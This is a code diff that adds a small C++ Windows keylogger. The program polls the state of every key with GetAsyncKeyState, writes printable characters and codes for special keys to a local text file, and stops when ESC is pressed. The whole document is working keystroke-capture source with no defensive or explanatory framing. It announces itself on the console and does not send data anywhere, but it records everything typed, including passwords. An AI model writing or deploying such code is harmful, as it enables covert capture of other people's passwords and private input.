@@ -1,0 +1,46 @@
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+
+using namespace std;
+
+int main() {
+    // Define the log file name
+    const char* logFile = "simple_keylog.txt";
+
+    // Open the file in append mode
+    ofstream file(logFile, ios::app);
+
+    if (!file.is_open()) {
+        cerr << "Failed to open log file." << endl;
+        return 1;
+    }
+
+    cout << "Logging keystrokes... Press ESC to stop." << endl;
+
+    // Main loop to capture keystrokes
+    while (true) {
+        for (int key = 8; key <= 255; key++) { // Check all keys
+            if (GetAsyncKeyState(key) & 0x8000) { // If the key is pressed
+                if (key == VK_ESCAPE) { // Exit key (ESC)
+                    file.close();
+                    cout << "Exiting keylogger." << endl;
+                    return 0;
+                }
+
+                // Log readable characters
+                if (key >= 32 && key <= 126) {
+                    file << char(key);
+                } else {
+                    // Log special keys
+                    file << " [" << key << "] ";
+                }
+
+                file.flush(); // Write immediately to file
+                Sleep(100); // Small delay to avoid excessive logging
+            }
+        }
+    }
+
+    return 0;
+}
